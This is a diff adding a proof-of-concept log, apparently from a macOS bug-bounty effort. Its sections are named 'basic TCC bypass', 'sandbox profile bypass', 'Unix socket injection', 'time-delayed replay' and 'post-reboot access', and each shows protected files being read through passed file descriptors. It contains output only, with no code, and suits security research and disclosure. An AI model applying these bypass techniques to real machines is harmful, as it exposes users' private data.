@@ -1,0 +1,53 @@
+FD-Based Capability Bounty Log - Sat May 24 15:11:51 +03 2025
+=== BASIC TCC BYPASS ===
+[Child] Read from secret file:
+bplist00�^IIO_LaunchInfo_kAOSUIProfilePictureCropRect#?�a�
+[Parent] Opened FD 3 to /Users/farukalpay/Library/Preferences/com.apple.Safari.plist
+=== SANDBOX PROFILE BYPASS ===
+[Parent] open failed: Operation not permitted
+Invalid control message
+=== SANDBOX PROFILE BYPASS ===
+[Child] Read from secret file:
+bplist00�^IIO_LaunchInfo_kAOSUIProfilePictureCropRect#?�a�
+=== FORK-FREE EXEC TRANSFER ===
+[parent] Opened FD 5 to /Users/farukalpay/Documents/secret_tcc.txt
+[parent] Sent FD 5 to child
+[xpc_receiver] Waiting to receive FD over socket 3...
+[xpc_receiver] Received FD 6. Reading...
+[xpc_receiver] Read content (19 bytes):
+Ξ∞ Private Data
+
+=== FORK-FREE EXEC TRANSFER ===
+[parent] Opened FD 5 to /Users/farukalpay/Documents/secret_tcc.txt
+[parent] Sent FD 5 to child
+[xpc_receiver] Waiting to receive FD over socket 3...
+[xpc_receiver] Received FD 6. Reading...
+[xpc_receiver] Read content (19 bytes):
+Ξ∞ Private Data
+
+=== FORK-FREE EXEC TRANSFER (RAW OK) ===
+[parent] Opened FD 5 to /Users/farukalpay/Documents/secret_tcc.txt
+[parent] Sent FD 5 to child
+[xpc_receiver] Waiting to receive FD over socket 3...
+[xpc_receiver] Received FD 6. Reading...
+[xpc_receiver] Read 19 bytes (raw):
+Ξ∞ Private Data
+
+=== UNIX SOCKET INJECTION ===
+[φListener] Connected to /tmp/Ξ∞.sock
+[φListener] Received FD 4. Reading...
+[φListener] Read 19 bytes:
+Ξ∞ Private Data
+
+=== TIME-DELAYED REPLAY ===
+[φReplayReceiver] Connected. Waiting for FD...
+[φReplayReceiver] Received FD 4. Reading...
+[φReplayReceiver] Read 19 bytes:
+Ξ∞ Private Data
+
+=== POST-REBOOT ACCESS ===
+[φPostBootReceiver] Connected to socket. Receiving FD...
+[φPostBootReceiver] Received FD 4. Reading...
+[φPostBootReceiver] Read 19 bytes:
+Ξ∞ Private Data
+
